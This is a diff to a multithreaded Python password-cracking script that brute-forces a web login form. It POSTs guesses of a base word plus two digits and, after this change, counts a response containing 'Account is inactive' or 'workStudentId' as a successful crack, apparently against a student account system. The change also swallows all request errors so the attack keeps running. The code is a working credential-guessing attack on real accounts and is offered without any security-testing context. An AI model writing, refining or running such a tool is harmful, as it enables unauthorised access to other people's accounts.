@@ -57,20 +57,6 @@ def DebugPrint(Category, Text, Color):
           colored('['+Category+'] ', 'magenta')+colored(Text, Color))
 
 
-def safeSplit(text, split, i):
-    working = text.split(split)
-    if len(working)-1 >= i:
-        return working[i]
-    return text
-
-
-def checkIfCorrect(data):
-    working = safeSplit(
-        data, '<span style=\"font-weight:bold;\">Error Logging In:</span> ', 1)
-    working = safeSplit(working, '\r', 0)
-    return working
-
-
 class check(threading.Thread):
     # Init Vars needed to crack passwords
     def __init__(self, thread, url, checkUrl, pWordIta, pWord, uName, timeout, startTime, startIndex, endIndex):
@@ -102,10 +88,10 @@ class check(threading.Thread):
                 # Try Password
                 data = ses.post(self.url, timeout=self.timeout,
                                 data=dataToSend)
-                # Check if is correct password
-            except requests.Timeout:
+            except:
                 continue
-            if checkIfCorrect(data.text) != "Account is inactive":
+            # Check if is correct password
+            if not "Account is inactive" in data.text and not "workStudentId" in data.text:
                 continue
             DebugPrint(
                 "Complete", f'{colored("Password", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(f"{self.pWord}{str(i).zfill(2)}", "green")} {colored(f"[{int(time.time() - self.startTime)}]", "blue")}', "cyan")
